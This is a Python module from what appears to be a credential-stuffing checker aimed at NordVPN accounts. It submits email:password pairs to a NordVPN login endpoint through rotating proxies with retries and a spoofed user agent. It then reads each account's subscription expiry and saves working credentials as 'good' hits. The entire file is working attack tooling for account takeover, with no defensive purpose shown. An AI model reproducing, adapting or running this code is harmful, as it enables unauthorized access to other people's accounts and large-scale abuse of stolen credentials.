from modules.variables import Checker
from requests import Session
from modules.functions import return_proxy, set_proxy, log, save, bad_proxy
from base64 import b64encode
from datetime import datetime
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = f"password={password}&username={email}"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36" ,
                    "Host": "zwyr157wwiu6eior.com" ,
                    "Connection": "Keep-Alive" ,
                    "Content-Type":"application/x-www-form-urlencoded"
                }
                r = s.post("https://zwyr157wwiu6eior.com/v1/users/tokens",data=payload,headers=headers)
                if "Invalid username" in r.text or "Invalid password" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "token" not in r.text:
                    raise
                
                token = b64encode((f"token:{r.json()['token']}").encode()).decode()
                headers = {
                    "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
                    "Authorization": f"Basic {token}"
                }
                r = s.get("https://zwyr157wwiu6eior.com/v1/users/services",headers=headers)
                if r.text == "[]":
                    if not Checker.cui: log("custom",":".join([email,password]),"NordVPN")
                    save("NordVPN","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                
                data = r.json()[0]
                date = data["expires_at"]
                expire = int(data["expires_at"].split(" ")[0].replace("-",""))
                nowtime = int(datetime.now().strftime("%Y%m%d"))
                if expire > nowtime:
                    if not Checker.cui: log("good",":".join([email,password]),"NordVPN")
                    save("NordVPN","good",Checker.time,":".join([email,password])+f" | Expire: {date}")
                    Checker.good += 1
                    return_proxy(proxy)
                    return
                else:
                    if not Checker.cui: log("custom",":".join([email,password]),"NordVPN")
                    save("NordVPN","custom",Checker.time,":".join([email,password]))
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        